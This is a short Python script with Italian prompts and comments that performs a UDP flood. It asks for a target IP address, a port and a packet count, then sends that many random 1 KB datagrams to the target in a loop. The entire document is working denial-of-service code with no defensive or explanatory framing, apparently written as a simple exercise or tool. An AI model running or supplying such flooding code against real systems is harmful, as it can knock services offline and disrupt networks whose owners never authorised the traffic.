import socket
import random

IP_Target = input("Inserire l'ID Bersaglio: ")
UDP_Port = int(input("Inserire la porta UDP del target: "))
Packet_Number = int(input("Inserire il numero di pacchetti da inviare: "))

client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM) #Stabiliamo una connessione
bytes_to_send = random.randbytes(1024) # indico che un pacchetto inviato deve essere di 1 Kb
for i in range(Packet_Number):
    client.sendto(bytes_to_send, (IP_Target, UDP_Port)) #Mando il pacchetto